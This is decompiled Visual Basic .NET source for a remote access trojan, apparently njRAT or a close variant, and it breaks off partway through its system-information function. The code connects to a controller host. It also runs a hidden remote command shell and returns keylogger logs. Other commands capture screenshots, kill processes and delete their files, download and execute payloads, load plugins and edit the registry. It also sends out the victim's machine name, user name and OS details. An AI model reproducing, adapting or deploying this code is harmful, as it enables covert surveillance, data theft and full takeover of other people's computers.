Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic.Devices
Imports Microsoft.Win32
Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports System.Environment

Namespace ClassLibrary1
    <StandardModule()> _
    Friend NotInheritable Class OK
        ' Methods
        <CompilerGenerated(), DebuggerStepThrough()> _
        Private Shared Sub _Lambda__1(ByVal a0 As Object)
            OK.Send(Conversions.ToString(a0))
        End Sub

        <DebuggerStepThrough(), CompilerGenerated()> _
        Private Shared Sub _Lambda__2(ByVal a0 As Object, ByVal a1 As EventArgs)
            OK.ex()
        End Sub

        <DebuggerStepThrough(), CompilerGenerated()> _
        Private Shared Sub _Lambda__3(ByVal a0 As Object)
            OK.Ind(DirectCast(a0, Byte()))
        End Sub

        Public Shared Function ACT() As String
            Dim str As String
            Dim str3 As String
            Try
                Dim num As Integer
                Dim foregroundWindow As IntPtr = OK.GetForegroundWindow
                If (foregroundWindow = IntPtr.Zero) Then
                    str3 = " "
                    Return OK.ENB(str3)
                End If
                Dim windowTextLength As Integer = OK.GetWindowTextLength(CLng(foregroundWindow))
                Dim winTitle As String = Strings.StrDup((windowTextLength + 1), "*")
                OK.GetWindowText(foregroundWindow, winTitle, (windowTextLength + 1))
                OK.GetWindowThreadProcessId(foregroundWindow, num)
                If (num = 0) Then
                    str = OK.ENB(winTitle)
                Else
                    Try
                        str = OK.ENB(Process.GetProcessById(num).MainWindowTitle)
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        Dim exception As Exception = exception1
                        str = OK.ENB(winTitle)
                        ProjectData.ClearProjectError()
                    End Try
                End If
            Catch exception3 As Exception
                ProjectData.SetProjectError(exception3)
                Dim exception2 As Exception = exception3
                str3 = " "
                str = OK.ENB(str3)
                ProjectData.ClearProjectError()
            End Try
            Return str
        End Function

        Public Shared Function BS(ByRef B As Byte()) As String
            Return Encoding.Default.GetString(B)
        End Function

        Public Shared Function Cam() As Boolean
            Try
                Dim num As Integer = 0
                Do
                    Dim lpszVer As String = Nothing
                    If OK.capGetDriverDescriptionA(CShort(num), Strings.Space(100), 100, lpszVer, 100) Then
                        Return True
                    End If
                    num += 1
                Loop While (num <= 4)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
            Return False
        End Function

        <DllImport("avicap32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
        Public Shared Function capGetDriverDescriptionA(ByVal wDriver As Short, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszName As String, ByVal cbName As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszVer As String, ByVal cbVer As Integer) As Boolean
        End Function

        Private Shared Function CompDir(ByVal F1 As FileInfo, ByVal F2 As FileInfo) As Boolean
            If (F1.Name.ToLower = F2.Name.ToLower) Then
                Dim directory As DirectoryInfo = F1.Directory
                Dim parent As DirectoryInfo = F2.Directory
                Do
                    If (directory.Name.ToLower <> parent.Name.ToLower) Then
                        Return False
                    End If
                    directory = directory.Parent
                    parent = parent.Parent
                    If ((directory Is Nothing) And (parent Is Nothing)) Then
                        Return True
                    End If
                    If (directory Is Nothing) Then
                        Return False
                    End If
                Loop While (Not parent Is Nothing)
            End If
            Return False
        End Function

        Public Shared Function connect() As Boolean
            Dim flag As Boolean
            Dim lO As FileInfo = OK.LO
            SyncLock lO
                Try
                    If (Not OK.C Is Nothing) Then
                        Try
                            OK.C.Client.Disconnect(False)
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            Dim exception As Exception = exception1
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            OK.C.Close()
                            OK.C = Nothing
                        Catch exception7 As Exception
                            ProjectData.SetProjectError(exception7)
                            Dim exception2 As Exception = exception7
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    Try
                        OK.MeM.Dispose()
                    Catch exception8 As Exception
                        ProjectData.SetProjectError(exception8)
                        Dim exception3 As Exception = exception8
                        ProjectData.ClearProjectError()
                    End Try
                    OK.MeM = New MemoryStream
                    Try
                        If (Not OK.Pro Is Nothing) Then
                            OK.Pro.Kill()
                            OK.Pro = Nothing
                        End If
                    Catch exception9 As Exception
                        ProjectData.SetProjectError(exception9)
                        Dim exception4 As Exception = exception9
                        ProjectData.ClearProjectError()
                    End Try
                Catch exception10 As Exception
                    ProjectData.SetProjectError(exception10)
                    Dim exception5 As Exception = exception10
                    ProjectData.ClearProjectError()
                End Try
                Try
                    OK.C = New TcpClient
                    Thread.Sleep(&H3E8)
                    OK.C.Connect(OK.H, Conversions.ToInteger(OK.P))
                    OK.Cn = True
                    OK.Send(OK.inf)
                    If Not OK.Cn Then
                        Return False
                    End If
                    Return True
                Catch exception11 As Exception
                    ProjectData.SetProjectError(exception11)
                    Dim exception6 As Exception = exception11
                    OK.Cn = False
                    flag = False
                    ProjectData.ClearProjectError()
                    Return flag
                End Try
            End SyncLock
            Return flag
        End Function

        Public Shared Function DEB(ByRef s As String) As String
            Dim bytes As Byte() = Convert.FromBase64String(s)
            Return Encoding.UTF8.GetString(bytes)
        End Function

        Public Shared Sub DLV(ByVal n As String)
            Try
                OK.F.Registry.CurrentUser.OpenSubKey(("Software\" & OK.RG), True).DeleteValue(n)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Shared Sub ED()
            OK.pr(0)
        End Sub

        <DllImport("psapi")> _
        Public Shared Function EmptyWorkingSet(ByVal hProcess As Long) As Boolean
        End Function

        Public Shared Function ENB(ByRef s As String) As String
            Return Convert.ToBase64String(Encoding.UTF8.GetBytes(s))
        End Function

        Private Shared Sub ex()
            Try
                OK.Send("rsc")
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Shared Function FR() As String
            Dim str As String
            Try
                str = OK.LO.LastWriteTime.ToString("yyyy-MM-dd")
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                str = "unknown"
                ProjectData.ClearProjectError()
            End Try
            Return str
        End Function

        Public Shared Function fx(ByVal b As Byte(), ByVal spl As String) As Array
            Dim list As New List(Of Byte())
            Dim stream As New MemoryStream
            Dim stream2 As New MemoryStream
            Dim strArray As String() = Strings.Split(OK.BS(b), spl, -1, CompareMethod.Binary)
            stream.Write(b, 0, strArray(0).Length)
            stream2.Write(b, (strArray(0).Length + spl.Length), (b.Length - (strArray(0).Length + spl.Length)))
            list.Add(stream.ToArray)
            list.Add(stream2.ToArray)
            stream.Dispose()
            stream2.Dispose()
            Return list.ToArray
        End Function

        <DllImport("user32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
        Public Shared Function GetForegroundWindow() As IntPtr
        End Function

        Public Shared Function GetKey(ByVal key As String) As RegistryKey
            Dim str As String
            If key.StartsWith(OK.F.Registry.ClassesRoot.Name) Then
                str = key.Replace((OK.F.Registry.ClassesRoot.Name & "\"), "")
                Return OK.F.Registry.ClassesRoot.OpenSubKey(str, True)
            End If
            If key.StartsWith(OK.F.Registry.CurrentUser.Name) Then
                str = key.Replace((OK.F.Registry.CurrentUser.Name & "\"), "")
                Return OK.F.Registry.CurrentUser.OpenSubKey(str, True)
            End If
            If key.StartsWith(OK.F.Registry.LocalMachine.Name) Then
                str = key.Replace((OK.F.Registry.LocalMachine.Name & "\"), "")
                Return OK.F.Registry.LocalMachine.OpenSubKey(str, True)
            End If
            If key.StartsWith(OK.F.Registry.Users.Name) Then
                str = key.Replace((OK.F.Registry.Users.Name & "\"), "")
                Return OK.F.Registry.Users.OpenSubKey(str, True)
            End If
            Return Nothing
        End Function

        Public Shared Function getMD5Hash(ByVal B As Byte()) As String
            B = New MD5CryptoServiceProvider().ComputeHash(B)
            Dim str2 As String = ""
            Dim num As Byte
            For Each num In B
                str2 = (str2 & num.ToString("x2"))
            Next
            Return str2
        End Function

        <DllImport("kernel32", EntryPoint:="GetVolumeInformationA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
        Private Shared Function GetVolumeInformation(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpRootPathName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
        End Function

        <DllImport("user32.dll", EntryPoint:="GetWindowTextA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
        Public Shared Function GetWindowText(ByVal hWnd As IntPtr, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef WinTitle As String, ByVal MaxLength As Integer) As Integer
        End Function

        <DllImport("user32.dll", EntryPoint:="GetWindowTextLengthA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
        Public Shared Function GetWindowTextLength(ByVal hwnd As Long) As Integer
        End Function

        <DllImport("user32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
        Public Shared Function GetWindowThreadProcessId(ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
        End Function

        Public Shared Function GTV(ByVal n As String) As String
            Dim str As String
            Try
                str = Conversions.ToString(OK.F.Registry.CurrentUser.OpenSubKey(("Software\" & OK.RG)).GetValue(n, ""))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                str = ""
                ProjectData.ClearProjectError()
            End Try
            Return str
        End Function

        Public Shared Function HWD() As String
            Dim str As String
            Try
                Dim num As Integer
                Dim lpVolumeNameBuffer As String = Nothing
                Dim lpMaximumComponentLength As Integer = 0
                Dim lpFileSystemFlags As Integer = 0
                Dim lpFileSystemNameBuffer As String = Nothing
                OK.GetVolumeInformation((Interaction.Environ("SystemDrive") & "\"), lpVolumeNameBuffer, 0, num, lpMaximumComponentLength, lpFileSystemFlags, lpFileSystemNameBuffer, 0)
                str = Conversion.Hex(num)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                str = "ERR"
                ProjectData.ClearProjectError()
            End Try
            Return str
        End Function

        Public Shared Sub Ind(ByVal b As Byte())
            Dim strArray As String() = Strings.Split(OK.BS(b), OK.Y, -1, CompareMethod.Binary)
            Try
                Dim flag As Boolean
                Dim str16 As String = strArray(0)
                If (str16 = "proc") Then
                    Select Case strArray(1)
                        Case "~"
                            OK.Send(String.Concat(New String() {"proc", OK.Y, "pid", OK.Y, Conversions.ToString(System.Diagnostics.Process.GetCurrentProcess.Id)}))
                            Dim processes As Process() = System.Diagnostics.Process.GetProcesses
                            OK.Send(String.Concat(New String() {"proc", OK.Y, "~", OK.Y, Conversions.ToString(processes.Length)}))
                            Dim num As Integer = 0
                            Dim str As String = ""
                            Dim process As Process
                            For Each process In processes
                                num += 1
                                Try
                                    Try
                                        Dim str2 As String = ""
                                        Try
                                            str2 = OK.ENB(process.MainModule.FileVersionInfo.FileDescription)
                                        Catch exception1 As Exception
                                            ProjectData.SetProjectError(exception1)
                                            Dim exception As Exception = exception1
                                            ProjectData.ClearProjectError()
                                        End Try
                                        str = String.Concat(New String() {str, OK.Y, Conversions.ToString(process.Id), ",", process.MainModule.FileName, ",", str2})
                                    Catch exception21 As Exception
                                        ProjectData.SetProjectError(exception21)
                                        Dim exception2 As Exception = exception21
                                        str = String.Concat(New String() {str, OK.Y, Conversions.ToString(process.Id), ",", process.MainModule.FileVersionInfo.FileName, ",", OK.ENB(process.MainModule.FileVersionInfo.FileDescription)})
                                        ProjectData.ClearProjectError()
                                    End Try
                                Catch exception22 As Exception
                                    ProjectData.SetProjectError(exception22)
                                    Dim exception3 As Exception = exception22
                                    Dim str3 As String = ""
                                    Try
                                        str3 = OK.ENB(FileVersionInfo.GetVersionInfo((Interaction.Environ("windir") & "\system32\" & process.ProcessName & ".exe")).FileDescription)
                                    Catch exception23 As Exception
                                        ProjectData.SetProjectError(exception23)
                                        Dim exception4 As Exception = exception23
                                        ProjectData.ClearProjectError()
                                    End Try
                                    If File.Exists((Interaction.Environ("windir") & "\system32\" & process.ProcessName & ".exe")) Then
                                        Dim info As New FileInfo((Interaction.Environ("windir") & "\system32\" & process.ProcessName & ".exe"))
                                        str = String.Concat(New String() {str, OK.Y, Conversions.ToString(process.Id), ",", info.FullName, ",", str3})
                                    Else
                                        str = String.Concat(New String() {str, OK.Y, Conversions.ToString(process.Id), ",", process.ProcessName, ",", str3})
                                    End If
                                    ProjectData.ClearProjectError()
                                End Try
                                If (num = 10) Then
                                    num = 0
                                    Dim NewThread3 As New Thread(New ParameterizedThreadStart(AddressOf OK._Lambda__1), 1)
                                    NewThread3.Start(("proc" & OK.Y & "!" & str))
                                    str = ""
                                End If
                            Next
                            If (str <> "") Then
                                OK.Send(("proc" & OK.Y & "!" & str))
                            End If
                            Exit Select
                        Case "k"
                            Dim num7 As Integer = (strArray.Length - 1)
                            Dim i As Integer = 2
                            Do While (i <= num7)
                                Try
                                    Process.GetProcessById(Conversions.ToInteger(strArray(i))).Kill()
                                    OK.Send(String.Concat(New String() {"proc", OK.Y, "RM", OK.Y, strArray(i)}))
                                Catch exception24 As Exception
                                    ProjectData.SetProjectError(exception24)
                                    Dim exception5 As Exception = exception24
                                    OK.Send(String.Concat(New String() {"proc", OK.Y, "ER", OK.Y, exception5.Message}))
                                    ProjectData.ClearProjectError()
                                End Try
                                i += 1
                            Loop
                            Exit Select
                        Case "kd"
                            Dim num8 As Integer = (strArray.Length - 1)
                            Dim j As Integer = 2
                            Do While (j <= num8)
                                Try
                                    Dim fileName As String = ""
                                    Dim processById As Process = Process.GetProcessById(Conversions.ToInteger(strArray(j)))
                                    Try
                                        fileName = processById.MainModule.FileVersionInfo.FileName
                                    Catch exception25 As Exception
                                        ProjectData.SetProjectError(exception25)
                                        Dim exception6 As Exception = exception25
                                        Try
                                            fileName = processById.MainModule.FileName
                                        Catch exception26 As Exception
                                            ProjectData.SetProjectError(exception26)
                                            Dim exception7 As Exception = exception26
                                            ProjectData.ClearProjectError()
                                        End Try
                                        ProjectData.ClearProjectError()
                                    End Try
                                    processById.Kill()
                                    OK.Send(String.Concat(New String() {"proc", OK.Y, "RM", OK.Y, strArray(j)}))
                                    processById = Nothing
                                    Thread.Sleep(&H7D0)
                                    File.Delete(fileName)
                                    OK.Send(String.Concat(New String() {"proc", OK.Y, "ER", OK.Y, "Deleted ", fileName}))
                                Catch exception27 As Exception
                                    ProjectData.SetProjectError(exception27)
                                    Dim exception8 As Exception = exception27
                                    OK.Send(String.Concat(New String() {"proc", OK.Y, "ER", OK.Y, exception8.Message}))
                                    ProjectData.ClearProjectError()
                                End Try
                                j += 1
                            Loop
                            Exit Select
                        Case "re"
                            Dim num9 As Integer = (strArray.Length - 1)
                            Dim k As Integer = 2
                            Do While (k <= num9)
                                Try
                                    Dim str5 As String = ""
                                    Dim process3 As Process = Process.GetProcessById(Conversions.ToInteger(strArray(k)))
                                    Try
                                        str5 = process3.MainModule.FileVersionInfo.FileName
                                    Catch exception28 As Exception
                                        ProjectData.SetProjectError(exception28)
                                        Dim exception9 As Exception = exception28
                                        Try
                                            str5 = process3.MainModule.FileName
                                        Catch exception29 As Exception
                                            ProjectData.SetProjectError(exception29)
                                            Dim exception10 As Exception = exception29
                                            str5 = (Interaction.Environ("windir") & "\system32\" & process3.ProcessName & ".exe")
                                            ProjectData.ClearProjectError()
                                        End Try
                                        ProjectData.ClearProjectError()
                                    End Try
                                    process3.Kill()
                                    OK.Send(String.Concat(New String() {"proc", OK.Y, "RM", OK.Y, strArray(k)}))
                                    process3 = Nothing
                                    Process.Start(str5)
                                    OK.Send(String.Concat(New String() {"proc", OK.Y, "ER", OK.Y, "Started ", str5}))
                                Catch exception30 As Exception
                                    ProjectData.SetProjectError(exception30)
                                    Dim exception11 As Exception = exception30
                                    OK.Send(String.Concat(New String() {"proc", OK.Y, "ER", OK.Y, exception11.Message}))
                                    ProjectData.ClearProjectError()
                                End Try
                                k += 1
                            Loop
                            Exit Select
                    End Select
                    Return
                End If
                If (str16 = "rss") Then
                    Try
                        OK.Pro.Kill()
                    Catch exception31 As Exception
                        ProjectData.SetProjectError(exception31)
                        Dim exception12 As Exception = exception31
                        ProjectData.ClearProjectError()
                    End Try
                    OK.Pro = New Process
                    OK.Pro.StartInfo.RedirectStandardOutput = True
                    OK.Pro.StartInfo.RedirectStandardInput = True
                    OK.Pro.StartInfo.RedirectStandardError = True
                    OK.Pro.StartInfo.FileName = "cmd.exe"
                    AddHandler OK.Pro.OutputDataReceived, New DataReceivedEventHandler(AddressOf OK.RS)
                    AddHandler OK.Pro.ErrorDataReceived, New DataReceivedEventHandler(AddressOf OK.RS)
                    AddHandler OK.Pro.Exited, New EventHandler(AddressOf OK._Lambda__2)
                    OK.Pro.StartInfo.UseShellExecute = False
                    OK.Pro.StartInfo.CreateNoWindow = True
                    OK.Pro.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                    OK.Pro.EnableRaisingEvents = True
                    OK.Send("rss")
                    OK.Pro.Start()
                    OK.Pro.BeginErrorReadLine()
                    OK.Pro.BeginOutputReadLine()
                    Return
                End If
                If (str16 = "rs") Then
                    OK.Pro.StandardInput.WriteLine(OK.DEB(strArray(1)))
                    Return
                End If
                If (str16 = "rsc") Then
                    Try
                        OK.Pro.Kill()
                    Catch exception32 As Exception
                        ProjectData.SetProjectError(exception32)
                        Dim exception13 As Exception = exception32
                        ProjectData.ClearProjectError()
                    End Try
                    OK.Pro = Nothing
                    Return
                End If
                If (str16 = "kl") Then
                    OK.Send(("kl" & OK.Y & OK.ENB(OK.kq.Logs)))
                    Return
                End If
                If (str16 = "inf") Then
                    Dim str6 As String = ("inf" & OK.Y)
                    If (OK.GTV("vn") = "") Then
                        str6 = (str6 & OK.ENB((OK.DEB(OK.VN) & "_" & OK.HWD)) & OK.Y)
                    Else
                        str6 = (str6 & OK.ENB((OK.DEB(OK.GTV("vn")) & "_" & OK.HWD)) & OK.Y)
                    End If
                    OK.Send((((String.Concat(New String() {str6, OK.H, ":", OK.P, OK.Y}) & OK.DR & OK.Y) & OK.EXE & OK.Y) & Process.GetCurrentProcess.ProcessName))
                    Return
                End If
                If (str16 = "prof") Then
                    Select Case strArray(1)
                        Case "~"
                            OK.STV(strArray(2), strArray(3))
                            Exit Select
                        Case "!"
                            OK.STV(strArray(2), strArray(3))
                            OK.Send(String.Concat(New String() {"getvalue", OK.Y, strArray(1), OK.Y, OK.GTV(strArray(1))}))
                            Exit Select
                        Case "@"
                            OK.DLV(strArray(2))
                            Exit Select
                    End Select
                    Return
                End If
                If (str16 <> "rn") Then
                    GoTo Label_0CE1
                End If
                Dim bytes As Byte() = Nothing
                If Not strArray(2).ToLower.StartsWith("http") Then
                    Try
                        flag = False
                        bytes = OK.ZIP(Convert.FromBase64String(strArray(2)), flag)
                        GoTo Label_0C57
                    Catch exception33 As Exception
                        ProjectData.SetProjectError(exception33)
                        Dim exception14 As Exception = exception33
                        OK.Send(("MSG" & OK.Y & "Execute ERROR"))
                        OK.Send("bla")
                        ProjectData.ClearProjectError()
                        Return
                    End Try
                End If
                Dim client As New WebClient
                Try
                    bytes = client.DownloadData(strArray(2))
                Catch exception34 As Exception
                    ProjectData.SetProjectError(exception34)
                    Dim exception15 As Exception = exception34
                    OK.Send(("MSG" & OK.Y & "Download ERROR"))
                    OK.Send("bla")
                    ProjectData.ClearProjectError()
                    Return
                End Try
Label_0C57:
                OK.Send("bla")
                Dim path As String = String.Concat(New String() {Interaction.Environ("temp"), "\", OK.RN(10), ".", strArray(1)})
                File.WriteAllBytes(path, bytes)
                Process.Start(path)
                OK.Send(("MSG" & OK.Y & "Executed As " & New FileInfo(path).Name))
                Return
Label_0CE1:
                If (str16 = "inv") Then
                    Dim buffer2 As Byte()
                    OK.Send("bla")
                    Dim s As String = OK.GTV(strArray(1))
                    If (s.Length > 0) Then
                        buffer2 = Convert.FromBase64String(s)
                        OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(0)}))
                    Else
                        If (strArray(3).Length = 1) Then
                            OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, "False"}))
                            Return
                        End If
                        flag = False
                        buffer2 = OK.ZIP(Convert.FromBase64String(strArray(3)), flag)
                        If Conversions.ToBoolean(OK.STV(strArray(1), Convert.ToBase64String(buffer2))) Then
                            OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(0)}))
                        End If
                    End If
                    Dim objectValue As Object = RuntimeHelpers.GetObjectValue(OK.Plugin(buffer2, "A"))
                    NewLateBinding.LateSet(objectValue, Nothing, "h", New Object() {OK.H}, Nothing, Nothing)
                    NewLateBinding.LateSet(objectValue, Nothing, "p", New Object() {OK.P}, Nothing, Nothing)
                    NewLateBinding.LateSet(objectValue, Nothing, "osk", New Object() {strArray(2)}, Nothing, Nothing)
                    NewLateBinding.LateCall(objectValue, Nothing, "start", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
                    Do While Not Conversions.ToBoolean(Operators.OrObject(Not OK.Cn, Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, Nothing, "Off", New Object(0 - 1) {}, Nothing, Nothing, Nothing), True, False)))
                        Thread.Sleep(1)
                    Loop
                    NewLateBinding.LateSet(objectValue, Nothing, "off", New Object() {True}, Nothing, Nothing)
                    Return
                End If
                If (str16 = "ret") Then
                    Dim buffer3 As Byte()
                    OK.Send("bla")
                    Dim str9 As String = OK.GTV(strArray(1))
                    If (str9.Length > 0) Then
                        buffer3 = Convert.FromBase64String(str9)
                        OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(0)}))
                    Else
                        If (strArray(2).Length = 1) Then
                            OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, "True"}))
                            Return
                        End If
                        flag = False
                        buffer3 = OK.ZIP(Convert.FromBase64String(strArray(2)), flag)
                        If Conversions.ToBoolean(OK.STV(strArray(1), Convert.ToBase64String(buffer3))) Then
                            OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(0)}))
                        End If
                    End If
                    Dim instance As Object = RuntimeHelpers.GetObjectValue(OK.Plugin(buffer3, "A"))
                    OK.Send(String.Concat(New String() {"ret", OK.Y, strArray(1), OK.Y, OK.ENB(Conversions.ToString(NewLateBinding.LateGet(instance, Nothing, "GT", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))}))
                    Return
                End If
                If (str16 = "CAP") Then
                    Dim ptr As IntPtr
                    Dim bounds As Rectangle = Screen.PrimaryScreen.Bounds
                    Dim image As New Bitmap(Screen.PrimaryScreen.Bounds.Width, bounds.Height)
                    Dim g As Graphics = Graphics.FromImage(image)
                    Dim blockRegionSize As New Size(image.Width, image.Height)
                    g.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy)
                    Try
                        blockRegionSize = New Size(&H20, &H20)
                        bounds = New Rectangle(Cursor.Position, blockRegionSize)
                        Cursors.Default.Draw(g, bounds)
                    Catch exception35 As Exception
                        ProjectData.SetProjectError(exception35)
                        Dim exception16 As Exception = exception35
                        ProjectData.ClearProjectError()
                    End Try
                    g.Dispose()
                    Dim stream As New MemoryStream
                    b = OK.SB(("CAP" & OK.Y))
                    stream.Write(b, 0, b.Length)
                    Dim stream2 As New MemoryStream
                    image.GetThumbnailImage(Conversions.ToInteger(strArray(1)), Conversions.ToInteger(strArray(2)), Nothing, ptr).Save(stream2, ImageFormat.Jpeg)
                    Dim str10 As String = OK.getMD5Hash(stream2.ToArray)
                    If (str10 <> OK.lastcap) Then
                        OK.lastcap = str10
                        stream.Write(stream2.ToArray, 0, CInt(stream2.Length))
                    Else
                        stream.WriteByte(0)
                    End If
                    OK.Sendb(stream.ToArray)
                    stream.Dispose()
                    stream2.Dispose()
                    image.Dispose()
                    Return
                End If
                If (str16 = "P") Then
                    OK.Send("P")
                    Return
                End If
                If (str16 = "un") Then
                    Select Case strArray(1)
                        Case "~"
                            OK.UNS()
                            Exit Select
                        Case "!"
                            OK.pr(0)
                            ProjectData.EndApp()
                            Exit Select
                        Case "@"
                            OK.pr(0)
                            Process.Start(OK.LO.FullName)
                            ProjectData.EndApp()
                            Exit Select
                    End Select
                    Return
                End If
                If (str16 <> "up") Then
                    GoTo Label_1491
                End If
                Dim buffer4 As Byte() = Nothing
                If Not strArray(1).ToLower.StartsWith("http") Then
                    Try
                        flag = False
                        buffer4 = OK.ZIP(Convert.FromBase64String(strArray(1)), flag)
                        GoTo Label_13A8
                    Catch exception36 As Exception
                        ProjectData.SetProjectError(exception36)
                        Dim exception17 As Exception = exception36
                        OK.Send(("MSG" & OK.Y & "Update ERROR"))
                        OK.Send("bla")
                        ProjectData.ClearProjectError()
                        Return
                    End Try
                End If
                Dim client2 As New WebClient
                Try
                    buffer4 = client2.DownloadData(strArray(1))
                Catch exception37 As Exception
                    ProjectData.SetProjectError(exception37)
                    Dim exception18 As Exception = exception37
                    OK.Send(("MSG" & OK.Y & "Update ERROR"))
                    OK.Send("bla")
                    ProjectData.ClearProjectError()
                    Return
                End Try
Label_13A8:
                OK.Send("bla")
                OK.F.Registry.CurrentUser.SetValue("di", "")
                Dim str11 As String = (Interaction.Environ("temp") & "\" & OK.RN(10) & ".exe")
                File.WriteAllBytes(str11, buffer4)
                OK.Send(("MSG" & OK.Y & "Updating To " & New FileInfo(str11).Name))
                Process.Start(str11, ("UP:" & Conversions.ToString(Process.GetCurrentProcess.Id)))
                Dim num5 As Integer = 0
                Do
                    Thread.Sleep(10)
                    If Operators.ConditionalCompareObjectEqual(OK.F.Registry.CurrentUser.GetValue("di", ""), "!", False) Then
                        OK.UNS()
                    End If
                    num5 += 1
                Loop While (num5 <= 500)
                Return
Label_1491:
                If (str16 = "RG") Then
                    Dim key As RegistryKey = OK.GetKey(strArray(2))
                    Select Case strArray(1)
                        Case "~"
                            Dim str13 As String = String.Concat(New String() {"RG", OK.Y, "~", OK.Y, strArray(2), OK.Y})
                            Dim str12 As String = ""
                            Dim str14 As String
                            For Each str14 In key.GetSubKeyNames
                                If Not str14.Contains("\") Then
                                    str12 = (str12 & str14 & OK.Y)
                                End If
                            Next
                            Dim str15 As String
                            For Each str15 In key.GetValueNames
                                str12 = String.Concat(New String() {str12, str15, "/", key.GetValueKind(str15).ToString, "/", key.GetValue(str15, "").ToString, OK.Y})
                            Next
                            OK.Send((str13 & str12))
                            Exit Select
                        Case "!"
                            key.SetValue(strArray(3), strArray(4), DirectCast(Conversions.ToInteger(strArray(5)), RegistryValueKind))
                            Exit Select
                        Case "@"
                            key.DeleteValue(strArray(3), False)
                            Exit Select
                        Case "#"
                            key.CreateSubKey(strArray(3))
                            Exit Select
                        Case "$"
                            key.DeleteSubKeyTree(strArray(3))
                            Exit Select
                    End Select
                End If
            Catch exception38 As Exception
                ProjectData.SetProjectError(exception38)
                Dim exception19 As Exception = exception38
                Try
                    OK.Send(String.Concat(New String() {"ER", OK.Y, strArray(0), OK.Y, exception19.Message}))
                Catch exception39 As Exception
                    ProjectData.SetProjectError(exception39)
                    Dim exception20 As Exception = exception39
                    ProjectData.ClearProjectError()
                End Try
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Shared Function inf() As String
            Dim str2 As String = ("lv" & OK.Y)
            Try
                If (OK.GTV("vn") = "") Then
                    str2 = (str2 & OK.ENB((OK.DEB(OK.VN) & "_" & OK.HWD)) & OK.Y)
                Else
                    str2 = (str2 & OK.ENB((OK.DEB(OK.GTV("vn")) & "_" & OK.HWD)) & OK.Y)
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                str2 = (str2 & OK.ENB(OK.HWD) & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            Try
                str2 = (str2 & Environment.MachineName & OK.Y)
            Catch exception8 As Exception
                ProjectData.SetProjectError(exception8)
                Dim exception2 As Exception = exception8
                str2 = (str2 & "??" & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            Try
                str2 = (str2 & Environment.UserName & OK.Y)
            Catch exception9 As Exception
                ProjectData.SetProjectError(exception9)
                Dim exception3 As Exception = exception9
                str2 = (str2 & "??" & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            str2 = ((str2 & OK.FR & OK.Y) & "" & OK.Y)
            Try
                str2 = (str2 & OK.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win"))
            Catch exception10 As Exception
                ProjectData.SetProjectError(exception10)
                Dim exception4 As Exception = exception10
                str2 = (str2 & "??")
                ProjectData.ClearProjectError()
            End Try
            str2 = (str2 & "SP")
            Try
                Dim strArray As String() = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, CompareMethod.Binary)
                If (strArray.Length = 1) Then
                    str2 = (str2 & "0")
                End If
                str2 = (str2 & strArray((strArray.Length - 1)))
            Catch exception11 As Exception
